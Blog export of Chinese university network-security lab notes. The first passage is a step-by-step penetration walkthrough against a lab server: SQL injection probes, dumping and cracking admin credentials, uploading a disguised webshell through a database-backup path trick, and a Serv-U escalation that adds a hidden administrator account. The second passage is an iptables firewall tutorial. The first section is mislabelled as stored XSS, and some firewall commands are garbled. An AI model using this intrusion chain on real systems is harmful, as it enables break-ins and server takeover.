<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525075533509.png" alt="image-20200525075533509"></p>
<h1 id="10-跨站脚本攻击之存储型XSS"><a href="#10-跨站脚本攻击之存储型XSS" class="headerlink" title="10 跨站脚本攻击之存储型XSS"></a>10 跨站脚本攻击之存储型XSS</h1><h2 id="10-1-实验目的"><a href="#10-1-实验目的" class="headerlink" title="10.1 实验目的"></a>10.1 实验目的</h2><p>1）了解黑客是如何通过漏洞入侵网站，并获得服务器权限的<br>2）学习渗透测试完整过程</p>
<h2 id="10-2-实验原理"><a href="#10-2-实验原理" class="headerlink" title="10.2 实验原理"></a>10.2 实验原理</h2><p>首先，黑客通过挖掘网站的注入漏洞，进而通过获得的管理密码进去后台，通过数据库备份，拿到了webshell。<br>然后，黑客登录shell，通过2003服务器的提权exp拿下服务器权限。<br>至此，入侵过程全部完成。</p>
<h2 id="9-3-实验环境-1"><a href="#9-3-实验环境-1" class="headerlink" title="9.3 实验环境"></a>9.3 实验环境</h2><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525072848547.png" alt="image-20200525072848547"></p>
<p>目标机：<code>192.168.1.3</code></p>
<p>工具: C:\tools\web完整渗透</p>
<h2 id="9-4-实验步骤-1"><a href="#9-4-实验步骤-1" class="headerlink" title="9.4 实验步骤"></a>9.4 实验步骤</h2><h3 id="一、检测网站安全性"><a href="#一、检测网站安全性" class="headerlink" title="一、检测网站安全性"></a>一、检测网站安全性</h3><p>1.1我们浏览网站<code>http://192.168.1.3</code>页面，寻找漏洞时，一般情况下会通过扫描软件进行扫描，在这里，我们就不演示扫描过程了，我们直接找到个链接来测试，打开<code>http://192.168.1.3/see.asp?ID=461&amp;amp;titleID=86</code>这个链接，在后面随便添加个「’」号，发现页面报错。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084248432.png" alt="image-20200525084248432"></p>
<p>1.2如上图所知，我们输入’后，直接提示数据库错误界面，第一反映是该网站存在注入漏洞，我们用语句来确认该网站是否存在注入，我们输入<code>http://192.168.1.3/see.asp?ID=461&amp;amp;titleID=86and 1=1</code>。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084350962.png" alt="image-20200525084350962"></p>
<p>1.3我们在网站中输入<code>http://192.168.1.3/see.asp?ID=461&amp;amp;titleID=86and 1=2，</code>返回错误界面，一般来讲，当我们再网站尾部输入and 1=1和and 1=2 返回页面不同的情况下，且出现数据库报错的话，我们通常认为，该站点必存在SQL注入漏洞。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084346512.png" alt="image-20200525084346512"></p>
<h3 id="二、使用注入工具破解管理员用户、密码"><a href="#二、使用注入工具破解管理员用户、密码" class="headerlink" title="二、使用注入工具破解管理员用户、密码"></a>二、使用注入工具破解管理员用户、密码</h3><p>2.1在c:/tools/web完整渗透测试实验/啊D注入工具文件夹下，打开啊D注入工具。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084821068.png" alt="image-20200525084821068"></p>
<p>2.2把存在注入点的url复制到啊D注入工具中，选择左侧的SQL注入检测。</p>
<p>2.3我们点击『开始检测』，如果该网站存在注入，工具的下方会提示我们，并且提示我们该网站的数据库类型。如图所示</p>
<p>2.4我们选择『检测表段』，就是探测数据库的所有表段名称。</p>
<p>2.4我们选择『admin』段，然后开始选择『检测字段』，这里我们选择admin表段的原因在于基本上所有的管理员用户名和密码存放在admin表段。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084810658.png" alt="image-20200525084810658"></p>
<p>2.5我们选择password和admin，然后选择『检测内容』，破解对方的用户名和密码。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084915646.png" alt="image-20200525084915646"></p>
<p>2.6至此我们已经破解出来网站的管理员用户名和密码</p>
<h3 id="三、使用工具破解md5密码"><a href="#三、使用工具破解md5密码" class="headerlink" title="三、使用工具破解md5密码"></a>三、使用工具破解md5密码</h3><p>3.1我们得到的管理员密码是通过MD5值加密的，我们可以通过本地的MD5破解软件进行破解，打开C:\tools\web完整渗透\md5破解文件夹，打开md5crack.exe,这个md5crack就是通过字典的形式来破解md5值，所以具有一定的运气性，当然你的字典强大，跑成功密码的概率就高。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525084948373.png" alt="image-20200525084948373"></p>
<p>3.2我们在软件里面输入我们得到的md5值，软件会自动为我们破解出明文密码，这里能破解成功依赖于我们不错的密码字典，不是所有复杂的密码都能够被破解，如果有网络环境的同学，再实地测试时，可以通过访问<code>http://www.cmd5.com</code>来进行对md5值的破解。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085052488.png" alt="image-20200525085052488"></p>
<p>3.3至此，我们得到网站管理密码的明文，明文为123456.。</p>
<h3 id="四、找寻登录网站管理后台。"><a href="#四、找寻登录网站管理后台。" class="headerlink" title="四、找寻登录网站管理后台。"></a>四、找寻登录网站管理后台。</h3><p>4.1我们拿到了管理员的明文用户名和密码，现在需要我们来进入后台了，一般情况下，网站的后台都是<code>xx.com/admin/</code>或者是<code>xx.com/system</code>等，一般情况下，我们可以通过扫描软件来探测网站管理后台，我们打开C:\tools\web完整渗透\御剑后扫描文件夹，打开御剑后台扫描工具.exe。</p>
<p>4.2我们打开后，把我们需要探测的网站放进工具中，点击『开始扫描』。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085206652.png" alt="image-20200525085206652"></p>
<p>4.3我们通过扫描可以基本判定：<code>http://192.168.1.3/admin/login.asp</code>,我们打开该后台。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085232982.png" alt="image-20200525085232982"></p>
<p>4.4 我们输入已经破解出来的管理员用户名：linhai 密码:123456，成功登录后台。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085306713.png" alt="image-20200525085306713"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085320984.png" alt="image-20200525085320984"></p>
<h3 id="五、拿到网站webshell"><a href="#五、拿到网站webshell" class="headerlink" title="五、拿到网站webshell"></a>五、拿到网站webshell</h3><p>5.1我们既然已经进入了管理后台，那为了保持网站权限的持久性，我们需要拿到webshell,一般在后台拿shell的方法很多，具体的需要看网站后台的具体情况，就我们的站看，我们先打开『文章管理』，打开图片上传。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085502320.png" alt="image-20200525085502320"></p>
<p>5.2我们上传asp木马看看，木马在C:\tools\web完整渗透\木马文件夹中，我们直接上传该木马。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525085548286.png" alt="image-20200525085548286"></p>
<p>5.3我们把我们的木马更改下后缀名，原来的木马名称是mm.aspx,我们改为mm.jpg，然后上传，发现可以上传成功。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090143618.png" alt="image-20200525090143618"></p>
<p>5.4我们上传成功后，右键照片属性，看下它上传的位置，记录下来。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090148416.png" alt="image-20200525090148416"></p>
<p>5.5我们上传成功后，因为上传的图片，不能解析成木马脚本，正好我们的这个网站有备份数据库功能，我们可以通过备份数据的方式，重新命名脚本文件，使其能够作为木马脚本被执行，我们打开网站左侧的『数据管理』操作项，选择『备份/恢复数据库』。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090230131.png" alt="image-20200525090230131"></p>
<p>5.6在备份数据库中，数据库路径后面，填上我们刚才上传图片的地址，例：刚刚我获得的图片路<code>http://192.168.1.3/admin/Upfiles/201612798623.jpg</code>. 那我们在数据库路径后面填写『../admin/Upfiles/201612798623.jpg』.再备份的数据库路径后面我们填写『../db/1.aspx』.这样做的目的是把我们上传的jPG后缀的木马，重新备份成aspx文件，使我们的木马能够正常运行。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090136929.png" alt="image-20200525090136929"></p>
<p>5.7我们点击备份后，我们访问<code>http://192.168.1.3/db/1.aspx就是我们的木马地址了，木马的密码是77169,至此，我们就拿到了这个网站的webshell.。</code>如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090152312.png" alt="image-20200525090152312"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090132494.png" alt="image-20200525090132494"></p>
<h3 id="六、拿到服务器权限"><a href="#六、拿到服务器权限" class="headerlink" title="六、拿到服务器权限"></a>六、拿到服务器权限</h3><p>6.1进入webshell后，因为我们需要执行dos命令来添加管理员，所以点击webshell上端的『命令行』按钮，进入执行命令模式。</p>
<p>6.2我们尝试执行whoami命令，查看下我们是什么权限。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090953281.png" alt="image-20200525090953281"></p>
<p>6.3我们发现当我们执行whoami时，回显的是network service 权限，同学们应该清楚，在此权限下，是不能直接添加管理员账户的，我们添加账户时，回显是空白，证明无法添加用户。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090943337.png" alt="image-20200525090943337"></p>
<p>6.4单击”端口扫描”&gt;”扫描”按钮，发现目标系统开放着43958端口，即server-u服务。 如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090939013.png" alt="image-20200525090939013"></p>
<p>6.5单击“SU提权”，在cmdshell中输入命令“net user aaa 123456 /add”,然后单击“执行”按钮。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090934390.png" alt="image-20200525090934390"></p>
<p>6.6在cmdshell输入命令“net localgroup administrators aaa /add”,然后单击“执行”按钮。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090921323.png" alt="image-20200525090921323"></p>
<p>6.7 在cmdshell输入命令“net user”, ,然后单击“执行”按钮，查看用户aaa添加成功。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090924532.png" alt="image-20200525090924532"></p>
<p>6.8在cmdshell输入命令“net user aaa”, ,然后单击“执行”按钮，查看用户aaa属于administrators用户组。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090929136.png" alt="image-20200525090929136"></p>
<p>6.9单击“开始”-&gt;”运行”-&gt;”mstsc”-&gt;“192.168.1.3”,输入帐号“aaa”和密码“123456”-&gt;单击登陆“按钮”即可。如图所示</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090917829.png" alt="image-20200525090917829"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525090913391.png" alt="image-20200525090913391"></p>
<h2 id="9-5-实验思考-1"><a href="#9-5-实验思考-1" class="headerlink" title="9.5 实验思考"></a>9.5 实验思考</h2><p>1．在WEB入口添加那些设备有利于防护黑客入侵？</p>
<p>答：Web应用防火墙（WAF）、入侵检测系统（IDS)</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-4/image-20200525091311108.png" alt="image-20200525091311108"></p>
]]></content>
      <categories>
        <category>实验</category>
      </categories>
      <tags>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>网安平台实验3-综合实验</title>
    <url>/2020/05/24/2020-05-24-Network-Security-Experiment-3/</url>
    <content><![CDATA[<h3 id="【实验环境】"><a href="#【实验环境】" class="headerlink" title="【实验环境】"></a>【实验环境】</h3><table>
<thead>
<tr>
<th align="left">操作系统</th>
<th align="left">IP地址</th>
<th align="left">服务器角色</th>
<th align="left">登录账户密码</th>
</tr>
</thead>
<tbody><tr>
<td align="left">centos7</td>
<td align="left">192.168.1.11</td>
<td align="left">操作机</td>
<td align="left">用户名：root；密码：Simplexue123</td>
</tr>
</tbody></table>
<h1 id="防火墙实验"><a href="#防火墙实验" class="headerlink" title="防火墙实验"></a>防火墙实验</h1><p>共六个任务</p>
<h2 id="任务一、Linux防火墙Iptables基础"><a href="#任务一、Linux防火墙Iptables基础" class="headerlink" title="任务一、Linux防火墙Iptables基础"></a>任务一、Linux防火墙Iptables基础</h2><h3 id="1-1-任务描述"><a href="#1-1-任务描述" class="headerlink" title="1.1 任务描述"></a>1.1 任务描述</h3><p>本实验任务基于个人主机操作环境，主要完成以下内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">了解Iptables的基本概念与相应基础知识，熟悉使用语法。</span><br><span class="line">Iptables规则的增删改查的简单使用。</span><br></pre></td></tr></table></figure>

<p>通过完成本实验任务，要求学生了解iptables的基础概念，掌握使用语法，会进行简单规则的增，删，改，查；为完成后续防火墙实验任务奠定坚实的基础。</p>
<h3 id="1-2-实验目标"><a href="#1-2-实验目标" class="headerlink" title="1.2 实验目标"></a>1.2 实验目标</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">了解IPtables的基本概念与基础知识，熟悉使用语法。</span><br><span class="line">会进行简单规则的增删查。</span><br></pre></td></tr></table></figure>

<h3 id="1-3-实验工具"><a href="#1-3-实验工具" class="headerlink" title="1.3 实验工具"></a>1.3 实验工具</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:iptables" target="_blank" rel="noopener">iptables</a></p>
<h3 id="1-4-操作步骤"><a href="#1-4-操作步骤" class="headerlink" title="1.4 操作步骤"></a>1.4 操作步骤</h3><h4 id="1、防火墙一些概念"><a href="#1、防火墙一些概念" class="headerlink" title="1、防火墙一些概念"></a>1、防火墙一些概念</h4><p>从防火墙作用范围讲，防火墙可以大体分为主机防火墙和网络防火墙。</p>
<pre><code>主机防火墙：作用于单个机算机系统，例如个人电脑上windows自带的防火墙，linux系统上的iptables。
网络防火墙：往往处于网络入口或边缘，对企业网络入口进行防护，服务范围为整个企业的内部网络。中小企业可以使用一台x86服务器运用linux的iptables搭建功能强大的网络防火墙。</code></pre><p>网络防火墙和主机防火墙在企业网络架构中所处的网络位置不一样，它俩的结合能使企业网络更安全。</p>
<p>从产品形态讲，防火墙可以分为硬件防火墙和软件防火墙。</p>
<pre><code>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。
软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</code></pre><p>下面说说本实验的重点，Linux iptables。</p>
<p><strong>iptables其实并不是真正的防火墙</strong>，我们可以理解它为一个命令行工具，位于用户空间，我们用这个工具操作“安全框架”。netfilter是防火墙真正的安全框架（framework），netfilter位于内核空间。</p>
<p><strong>netfilter/iptables</strong>（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p>
<p>Netfilter是Linux操作系统内核的一个数据包处理模块，主要有如下功能：</p>
<pre><code>网络地址转换(NAT)
数据包内容修改
包过滤防火墙</code></pre><h4 id="2、Iptables基础"><a href="#2、Iptables基础" class="headerlink" title="2、Iptables基础"></a>2、Iptables基础</h4><pre><code>Iptables有表、链、规则的概念，规则应用于链中， 链必须属于表，iptables默认的链可以属于多个表，每张表可以有多个链，可以在表中自定义链。
Iptables按照规则（rules）来处理数据包，规则其实就是预定义的条件。规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、源端口、目的端口、协议等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</code></pre><h5 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h5><pre><code>iptables为我们提供了如下规则的分类，或者说，iptables为我们提供了如下“表”
filter表：负责包过滤功能，防火墙
nat表：网络地址转换功能
mangle表：拆解报文，做出修改，并重新封装数据包的功能
raw表：关闭nat表上启用的连接追踪机制</code></pre><h5 id="链的概念"><a href="#链的概念" class="headerlink" title="链的概念"></a>链的概念</h5><pre><code>iptables为我们提供了如下默认链
PREROUTING：路由前
INPUT：输入队列
FORWARD：转发队列
OUTPUT：输出队列
POSTROUTING：路由后   iptables为我们提供了如下默认链
PREROUTING：路由前
INPUT：输入队列
FORWARD：转发队列
OUTPUT：输出队列
POSTROUTING：路由后</code></pre><h5 id="表和链的对应关系："><a href="#表和链的对应关系：" class="headerlink" title="表和链的对应关系："></a>表和链的对应关系：</h5><pre><code>raw表对应：PREROUTING, OUTPUT链
mangle表对应：PREROUTING, INPUT, FORWARD, OUTPUT, POSTROUTING链
nat表对应：PREROUTING, OUTPUT, POSTROUTING，INPUT链
filter表对应：INPUT, FORWARD, OUTPUT链</code></pre><p>同一链在不同表中的执行优先级次序（由高而低）：</p>
<pre><code>raw --&gt; mangle --&gt; nat --&gt; filter</code></pre><h5 id="数据包经过iptables防火墙的处理流程"><a href="#数据包经过iptables防火墙的处理流程" class="headerlink" title="数据包经过iptables防火墙的处理流程"></a>数据包经过iptables防火墙的处理流程</h5><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524104349373.png" alt="image-20200524104349373"></p>
<h4 id="3、Iptables使用语法"><a href="#3、Iptables使用语法" class="headerlink" title="3、Iptables使用语法"></a>3、Iptables使用语法</h4><p>Centos7下可用firewalld和iptables两种防火墙管理方式,实验中使用iptables。</p>
<p><strong>基本语法格式：</strong></p>
<pre><code>iptables [-t table] SUBCOMMAND chain [matches..] [target]
-t tables：指明表，默认为filter表， 包括raw, mangle, nat表等；
SUBCOMMAND：子命令</code></pre><p><strong>链管理：</strong></p>
<pre><code>iptables -N CHAIN-NAME 新增一条自定义链;
iptables -X CHAIN-NAME 删除自定义的空链，先清除规则，才能删除链；
iptables -E CHAIN-NAME CHAIN-NEW-NAME 重命名自定义链，但要求是未被引用的链；
iptables -P {PREROUTING | INPUT | FORWARD | OUTPUT | POSTROUTING} {DROP| ACCEPT | REJECT} 设置链的默认策略；</code></pre><p><strong>规则管理：</strong></p>
<pre><code>-A：追加规则，默认追加在最后一个；
-I：插入规则，默认插入为第一个；
-D：删除规则，两种格式：指定规则或指定规则的序列号；
  - rule specification
  - rule number
-R：替换指定的规则；
-F：清空规则表；
-Z：给iptables计数器置0；
  iptables的每条规则，都有两个计数器
  - 此规则匹配到的所有的packets次数；
  - 此规则匹配到的所有packets大小之和；
-S：列出指定表上的规则，默认为所有表的规则，类似于iptables-save，可用于保存规则；</code></pre><p><strong>保存规则：</strong></p>
<pre><code># iptables -S &amp;gt; /etc/sysconfig/iptables 
或
# iptables-save &amp;gt; /etc/sysconfig/iptables</code></pre><p><strong>恢复规则:</strong></p>
<pre><code># iptables-restore &amp;lt; /etc/sysconfig/iptables</code></pre><p><strong>规则查看：</strong></p>
<pre><code>-L：列出规则；
-n：以数字格式显示地址和端口；
-v：显示详细信息；支持-vv，-vvv更详细信息；
-x：显示精确值；
--line-numbers：显示链上的规则的编号；
常用组合：-nvL，但L要写在后面</code></pre><h4 id="4、登陆实验机"><a href="#4、登陆实验机" class="headerlink" title="4、登陆实验机"></a>4、登陆实验机</h4><p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524104715389.png" alt="image-20200524104715389"></p>
<p>登陆帐号：root，登陆密码：Simplexue123</p>
<h4 id="5、Iptables简单使用"><a href="#5、Iptables简单使用" class="headerlink" title="5、Iptables简单使用"></a>5、Iptables简单使用</h4><p>使用man手册，如下图</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">man iptables</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524104730099.png" alt="image-20200524104730099"></p>
<p>查看filter表规则, iptables默认使用filter表，如下图</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -t filter -nvL </span><br><span class="line"><span class="meta">#</span><span class="bash">简写 iptables -nvL</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524105035069.png" alt="image-20200524105035069"></p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524105120323.png" alt="image-20200524105120323"></p>
<p>添加规则,允许所有网络访问本机，如下图</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -j ACCEPT</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524105239014.png" alt="image-20200524105239014"></p>
<p>注意：在不指定源、目的地址,源、目的IP,协议的情况下为全部IP、端口、协议<br>为FORWARD链添加默认规则，如下图</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -P FORWARD DROP</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524105530162.png" alt="image-20200524105530162"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables -P FORWARD ACCEPT</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524105618461.png" alt="image-20200524105618461"></p>
<h3 id="1-5-实验"><a href="#1-5-实验" class="headerlink" title="1.5 实验"></a>1.5 实验</h3><p>添加自定链test</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables () test</span><br><span class="line">-M</span><br></pre></td></tr></table></figure>

<p>删除自定链test</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">iptables () test</span><br><span class="line">-X</span><br></pre></td></tr></table></figure>

<h2 id="任务二、Iptables主机防火墙和审计"><a href="#任务二、Iptables主机防火墙和审计" class="headerlink" title="任务二、Iptables主机防火墙和审计"></a>任务二、Iptables主机防火墙和审计</h2><h3 id="2-1-任务描述"><a href="#2-1-任务描述" class="headerlink" title="2.1 任务描述"></a>2.1 任务描述</h3><p>本实验任务基于个人主机操作环境，主要完成以下内容：</p>
<pre><code>iptables的常用语法的实际操作。
进行Iptables的特殊参数，自定义策略的的操作。
启用Iptables日志记录的功能，配置相应的策略，进行操作，验证。</code></pre><p>通过完成本实验任务，要求学生<strong>掌握Iptables主机防火墙的常用配置</strong>已审计策略，具体包括：Iptables的常用语法，状态监测，特殊参数，自定义策略的使用，以及启用日志记录的功能进行相应的策略配置，具备更为夯石的防火墙配置使主机安全的能力。</p>
<h3 id="2-2-实验目标"><a href="#2-2-实验目标" class="headerlink" title="2.2 实验目标"></a>2.2 实验目标</h3><pre><code>掌握Iptables工作中的常用策略。
掌握审计策略。</code></pre><p>通过Iptables工作中的常用策略以及审计策略的学习和使用，具备丰富的主机安全防护的能力。</p>
<h3 id="2-3-实验工具"><a href="#2-3-实验工具" class="headerlink" title="2.3 实验工具"></a>2.3 实验工具</h3><p><a href="http://210.42.123.2:8088/doku.php?id=网络空间安全术语与概念:iptables" target="_blank" rel="noopener">iptables</a></p>
<h3 id="2-4-操作步骤"><a href="#2-4-操作步骤" class="headerlink" title="2.4 操作步骤"></a>2.4 操作步骤</h3><h4 id="1、常用语法"><a href="#1、常用语法" class="headerlink" title="1、常用语法"></a>1、常用语法</h4><p>对于任何协议及协议的扩展，通用匹配都可以直接使用。</p>
<p><strong>（1）匹配指定协议。</strong></p>
<p>-p，–protocol</p>
<p>例: iptables -A INPUT -p tcp -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524111515868.png" alt="image-20200524111515868"></p>
<p>说明匹配指定的协议，指定协议的形式有以下几种：</p>
<pre><code>a.名字不分大小写，但必须是在/etc/protocols中定义的；
b.可以使用协议相应的整数值。例如，ICMP的值是1，TCP是6，UDP是17；
c.不指定为ALL，相应数值是X，要注意这只代表匹配TCP、UDP、ICMP，而不是/etc/protocols中定义的所有协议；
d.可以是协议列表，以英文逗号为分隔符，如：udp，tcp；
e.可以在协议前加英文的感叹号表示取反，注意有空格，如：--protocol ! tcp表示非TCP协议，也就是UDP和ICMP。可以看出这个取反的范围只是TCP、UDP和ICMP。</code></pre><p><strong>（2）以IP源地址匹配包。</strong></p>
<p>-s，–src，–source</p>
<p>例: iptables -A INPUT -s 192.168.0.1 -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524111726891.png" alt="image-20200524111726891"></p>
<p>说明以IP源地址匹配包。地址的形式如下：</p>
<pre><code>a、 单个地址，如192.168.0.1，也可写成192.168.0.1/255.255.255.255或192.168.0.1/32；
b、 网络，如192.168.0.0/24，或192.168.0.0/255.255.255.0；
c、 在地址前加英文感叹号表示取反，注意空格，如--source ! 192.168.0.0/24表示除此地址外的所有地址；
d、 缺省是所有地址。</code></pre><p><strong>（3）以IP目的地址匹配包。</strong></p>
<p>-d，–dst，–destination</p>
<p>例: iptables -A INPUT -d 192.168.0.1 -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524111919474.png" alt="image-20200524111919474"></p>
<p>说明以IP目的地址匹配包。地址的形式和–source完全一样。</p>
<p><strong>（4）以包进入本地使用的网络接口匹配包。</strong></p>
<p>-i<br>例: iptables -A INPUT -i eth0 -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524111942291.png" alt="image-20200524111942291"></p>
<p>说明以包进入本地所使用的网络接口来匹配包。要注意这个匹配操作只能用于INPUT，FORWARD和PREROUTING这三个链，用在其他任何地方会提示错误信息。指定接口有以下方法：</p>
<pre><code>a、 指定接口名称，如：eth0、ppp0等；
b、 使用通配符，即英文加号，它代表字符数字串。若直接用一个加号，即iptables -A INPUT -i +表示匹配所有的包，而不考虑使用哪个接口。通配符还可以放在某一类接口的后面，如：eth+表示匹配所有从Ethernet接口进入的包；
c、 在接口前加英文感叹号表示取反，如：-i !eth0意思是匹配来自除eth0外的所有包。</code></pre><p><strong>（5）以包离开本地所使用的网络接口来匹配包。</strong></p>
<p>-o<br>例: iptables -A OUTPUT -o eth0 -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112058994.png" alt="image-20200524112058994"></p>
<p>说明以包离开本地所使用的网络接口来匹配包。要注意这个匹配操作只能用于OUTPUT，FORWARD和POSTROUTING这三个链，用在其他任何地方会提示错误信息。</p>
<p><strong>（6）匹配通信源端口。</strong></p>
<p>–source-port，–sport<br>例: iptables -A INPUT -p tcp –sport 1111</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112220963.png" alt="image-20200524112220963"></p>
<p>说明当通信协议为TCP或UDP时，可以指定匹配的源端口，但必须与匹配协议相结合使用。</p>
<p><strong>（7）匹配通信目的端口。</strong></p>
<p>– destination-port，–dport<br>例: iptables -A INPUT -p tcp –dport 80</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112258214.png" alt="image-20200524112258214"></p>
<p>说明当通信协议为TCP或UDP时，可以指定匹配的目的端口，但必须与匹配协议相结合使用。</p>
<h4 id="2、状态检测"><a href="#2、状态检测" class="headerlink" title="2、状态检测"></a>2、状态检测</h4><p>-m state –state {NEW,ESTATBLISHED,INVALID,RELATED},指定检测那种状态</p>
<ul>
<li>（1）NEW:该包想要建立一个新的连接（重新连接或连接重定向）。</li>
<li>（2）RELATED:该包是属于某个已经建立的连接所建立的新连接。</li>
<li>（3）ESTABLISHED：该包属于某个已经建立的连接。</li>
<li>（4）INVALID:该包不匹配于任何连接，通常这些包被DROP。</li>
</ul>
<p>例: iptables -A INPUT -p tcp –dport 22 -m state –state NEW,ESTABLISHED -j ACCEPT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112650291.png" alt="image-20200524112650291"></p>
<h4 id="3、特殊参数"><a href="#3、特殊参数" class="headerlink" title="3、特殊参数"></a>3、特殊参数</h4><p><strong>–icmp-type 指定ICMP的类型编号</strong></p>
<p>例: iptables -A INPUT -p icmp –icmp-type 8</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112849486.png" alt="image-20200524112849486"></p>
<p><strong>-m multiport 指定多端口号</strong></p>
<ul>
<li>　–sport</li>
<li>　–dport</li>
<li>　–ports</li>
</ul>
<p>例: iptables -A INPUT -p tcp -m multiport –dport 22,53,80,110</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112858540.png" alt="image-20200524112858540"></p>
<p><strong>-m iprange 指定IP段</strong></p>
<ul>
<li>　–src-range ip-ip</li>
<li>　–dst-range ip-ip</li>
</ul>
<p>例: iptables -A INPUT -m iprange –src-range 192.168.1.2-192.168.1.7 -j DROP</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112916108.png" alt="image-20200524112916108"></p>
<p><strong>-m connlimit 连接限定</strong></p>
<p>　–comlimit-above # 限定大连接个数</p>
<p>例: iptables -A INPUT -p tcp –syn –dport 22 -m connlimit –connlimit-above 100 -j REJECT</p>
<p><img src="/2020/05/24/2020-05-24-Network-Security-Experiment-3/image-20200524112940656.png" alt="image-20200524112940656"></p>
<p><strong>-m limit 现在连接速率，也就是限定匹配数据包的个数</strong></p>
<ul>
<li>　–limit # 指定速率</li>
<li>　–limit-burst # 峰值速率，最大限定</li>
</ul>
<p>例: iptables -A INPUT -m limit –limit-burst 6</p>
